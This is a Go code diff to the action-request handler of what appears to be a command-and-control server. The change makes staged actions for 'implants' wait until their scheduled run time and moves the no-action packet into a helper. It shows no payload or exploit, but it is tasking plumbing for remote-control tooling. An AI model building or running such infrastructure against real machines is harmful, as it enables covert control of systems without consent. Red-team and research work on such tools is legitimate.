@@ -31,20 +31,20 @@ func ActionRequestHandler(packet Packet) ([]Packet, error) {
 
 	// If there are not actions, send nothing
 	if len(stagedActions) == 0 {
-		packet := Packet{
-			Fingerprint: "fingerprint",
-			Implant:     packet.Implant,
-			PacketType:  NoActionEnum,
-			NumLeft:     0,
-			Data:        "",
-		}
-
-		allPackets = append(allPackets, packet)
+		allPackets = append(allPackets, generateNoAction(packet.Implant))
 		return allPackets, nil
 	}
 
 	for i := 0; i < len(stagedActions); i++ {
+		// Check the time to see if its is ready to go out
+		ttRun, _ := time.Parse(crud.TimeStamp, stagedActions[i].TimeToRun)
+		tNow := time.Now().Format(crud.TimeStamp)
+		t, _ := time.Parse(crud.TimeStamp, tNow)
+		if ttRun.After(t) {
+			continue
+		}
 
+		// Generate the action into a packet for the implant
 		action, err := generateAction(stagedActions[i])
 		if err != nil {
 			continue
@@ -60,7 +60,6 @@ func ActionRequestHandler(packet Packet) ([]Packet, error) {
 			Data:        string(bytes),
 		}
 
-		// packetCtr--
 		allPackets = append(allPackets, actionPacket)
 
 		// MOVE STAGED TO EXECUTED HERE
@@ -74,7 +73,23 @@ func ActionRequestHandler(packet Packet) ([]Packet, error) {
 		d.InsertExecutedAction(executed)
 	}
 
+	// If there were no actions ready to be queued tell implant no actions
+	if len(allPackets) == 0 {
+		allPackets = append(allPackets, generateNoAction(packet.Implant))
+	}
+
 	return allPackets, nil
+}
+
+// generateNoAction returns a NoActionPacket for the server to send
+func generateNoAction(implantInfo ImplantInfo) Packet {
+	return Packet{
+		Fingerprint: "fingerprint",
+		Implant:     implantInfo,
+		PacketType:  NoActionEnum,
+		NumLeft:     0,
+		Data:        "",
+	}
 }
 
 // generateAction given a staged action, it will return a sendable action Packet
